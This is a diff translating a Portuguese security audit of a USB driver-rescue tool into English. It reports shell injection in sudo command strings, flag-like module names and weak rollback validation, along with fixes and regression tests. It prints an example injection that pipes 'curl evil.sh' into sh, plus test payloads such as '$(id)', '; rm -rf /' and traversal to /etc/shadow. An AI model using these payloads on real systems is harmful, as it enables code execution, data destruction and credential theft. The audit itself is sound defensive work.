@@ -1,118 +1,118 @@
-# Auditoria de segurança ofensiva — agosto/2026
+# Offensive security audit — August 2026
 
-**Escopo:** `dongle-driver-rescue`, invariantes S1–S7 do
-[ADR 0002](adr/0002-seguranca-supply-chain.md).
-**Método:** ataque executado contra o código real, não revisão de leitura.
-Cada payload foi montado, rodado e o resultado observado.
+**Scope:** `dongle-driver-rescue`, S1–S7 invariants from
+[ADR 0002](adr/0002-supply-chain-security.md).
+**Method:** attack executed against the real code, not a read-through review.
+Each payload was built, run, and the result observed.
 
 ---
 
-## Resumo
+## Summary
 
 | | |
 |---|---|
-| Achados **críticos** | **7** (todos corrigidos) |
-| Achados médios | 2 (corrigidos) |
-| Invariantes que resistiram | S3 (caminho de firmware), S1 (comando de pacote), S2 (allowlist) |
-| Testes de regressão adicionados | 45 |
+| **Critical** findings | **7** (all fixed) |
+| Medium findings | 2 (fixed) |
+| Invariants that held | S3 (firmware path), S1 (package command), S2 (allowlist) |
+| Regression tests added | 45 |
 
-O achado central não foi um validador fraco: foi um validador **correto que não
-era chamado**. `require_module_name` existia, cobria exatamente o caso, e o
-caminho que monta comandos com `sudo` não passava por ele.
+The central finding was not a weak validator: it was a **correct validator that was never
+called**. `require_module_name` existed, covered exactly that case, and the
+path that builds commands with `sudo` did not go through it.
 
 ---
 
-## CRÍTICO-1 — Injeção de shell em comando com `sudo` (S1, S6)
+## CRITICAL-1 — Shell injection in `sudo` command (S1, S6)
 
-`plan_state_b` interpolava o nome do módulo direto em strings de shell:
+`plan_state_b` interpolated the module name directly into shell strings:
 
 ```python
 f"echo '{vid} {pid}' | sudo tee /sys/bus/usb/drivers/{module}/new_id"
 f"printf '...' '{alias.strip()}' | sudo tee -a {conf_path}"
 ```
 
-O valor de `module` chega de **três origens não confiáveis**:
+The `module` value arrives from **three untrusted sources**:
 
-| Origem | Procedência |
+| Source | Provenance |
 |---|---|
-| `bound_driver` | lido do **sysfs** do host |
-| `loaded_module` | lido do host |
-| `preferred_module` / `new_id_modules` | JSON da base de conhecimento |
+| `bound_driver` | read from the host **sysfs** |
+| `loaded_module` | read from the host |
+| `preferred_module` / `new_id_modules` | knowledge-base JSON |
 
-Nenhuma era validada. Uma aspa simples no nome fecha o quoting e emenda comando
-arbitrário — numa linha que **o próprio produto instrui o usuário a rodar com
+None was validated. A single quote in the name closes the quoting and appends an
+arbitrary command — on a line that **the product itself instructs the user to run with
 `sudo`**:
 
 ```
 echo '148f 7601' | sudo tee /sys/bus/usb/drivers/mt7601u' ; curl evil.sh | sh ; '/new_id
 ```
 
-Payloads confirmados funcionando antes da correção: aspa simples, `$(id)`,
-backtick, travessia de caminho (`../../../../etc/cron.d/evil`) e nova linha.
+Payloads confirmed working before the fix: single quote, `$(id)`,
+backtick, path traversal (`../../../../etc/cron.d/evil`), and newline.
 
-Isso contraria diretamente o S1 declarado no ADR: *"nenhum comando ou path
-concatenado sem passar pela camada de validação S2/S3"*.
+This directly contradicts the S1 declared in the ADR: *"no concatenated command or path
+without passing through the S2/S3 validation layer"*.
 
-**Correção:** `module = require_module_name(module)` antes de qualquer
-interpolação. 24 testes de regressão (8 payloads × 3 origens).
-
----
-
-## MÉDIO-1 — Gramática aceitava módulo iniciado por hífen (S3)
-
-`[a-z0-9_-]{1,64}` aceitava `-rf`, `--force`. Usado como **argumento** de
-comando, um nome desses deixa de ser nome e vira flag. Nenhum módulo real do
-kernel começa com hífen.
-
-**Correção:** `[a-z0-9][a-z0-9_-]{0,63}`.
+**Fix:** `module = require_module_name(module)` before any
+interpolation. 24 regression tests (8 payloads × 3 sources).
 
 ---
 
-## MÉDIO-2 — Rollback validava um caminho e não o outro (S6)
+## MEDIUM-1 — Grammar accepted modules starting with a hyphen (S3)
 
-Na mesma função `plan_rollback`, dois pesos:
+`[a-z0-9_-]{1,64}` accepted `-rf`, `--force`. Used as a command **argument**,
+such a name stops being a name and becomes a flag. No real kernel
+module starts with a hyphen.
+
+**Fix:** `[a-z0-9][a-z0-9_-]{0,63}`.
+
+---
+
+## MEDIUM-2 — Rollback validated one path but not the other (S6)
+
+In the same `plan_rollback` function, two standards:
 
 ```python
-# remove_file — rigoroso
+# remove_file — strict
 if not (isinstance(path, str) and path.startswith("/")
         and os.path.normpath(path) == path):
     raise ValueError(...)
 
-# remove_new_id — só "é string não vazia"
+# remove_new_id — only "is a non-empty string"
 if not isinstance(driver, str) or not driver or not isinstance(vid_pid, str):
     raise ValueError(...)
 ```
 
-`driver="x; id"` passava. O journal fica em disco e pode ser adulterado: é
-entrada não confiável como qualquer outra.
+`driver="x; id"` passed. The journal lives on disk and can be tampered with: it is
+untrusted input like any other.
 
-**Correção:** `require_module_name` no driver e regex de `vid:pid` hex.
+**Fix:** `require_module_name` on the driver and a hex `vid:pid` regex.
 
 ---
 
-## O que resistiu
+## What held
 
-Atacado e **não** quebrou:
+Attacked and **not** broken:
 
-- **Travessia de diretório em firmware (S3)** — 13 payloads rejeitados:
+- **Directory traversal in firmware (S3)** — 13 payloads rejected:
   `../../../etc/shadow`, `/etc/passwd`, `..\..\windows`, `a/../../b`,
-  `....//....//`, byte nulo, backslash. Caminhos legítimos seguem aceitos.
-- **Comando de instalação de pacote (S1)** — 9 payloads rejeitados
-  (`; rm -rf /`, `&&`, `-y`, `$(id)`, pipe, nova linha) e gerenciador fora da
-  allowlist recusado (S2).
-- **Contenção de symlink** — `os.path.commonpath` impede escapar da raiz de
-  firmware.
-- **SPEC §37** — o produto continua sem executar reparo algum.
+  `....//....//`, null byte, backslash. Legitimate paths remain accepted.
+- **Package install command (S1)** — 9 payloads rejected
+  (`; rm -rf /`, `&&`, `-y`, `$(id)`, pipe, newline) and an off-allowlist
+  manager refused (S2).
+- **Symlink containment** — `os.path.commonpath` prevents escaping the
+  firmware root.
+- **SPEC §37** — the product still executes no repair.
 
 ---
 
-## Ressalva de método
+## Method caveat
 
-A auditoria cobriu as superfícies que recebem entrada não confiável e montam
-comando ou caminho. **Não** cobriu: teste com dongle USB físico conectado,
-fuzzing prolongado dos parsers, nem análise do binário empacotado.
+The audit covered surfaces receiving untrusted input that build
+commands or paths. It did **not** cover: testing with a physical USB dongle
+plugged in, prolonged parser fuzzing, or analysis of the packaged binary.
 
-O padrão que se repete neste repositório merece registro: os 186 testes
-passavam com o CLI inteiramente inoperante, e passavam também com a injeção de
-shell acima. Testes que injetam apenas dependências falsas não exercitam o
-caminho por onde entra o dado hostil real.
+The pattern repeating in this repository deserves noting: all 186 tests
+passed with the CLI entirely inoperable, and also passed with the shell
+injection above. Tests injecting only fake dependencies do not exercise the
+path through which the real hostile data enters.
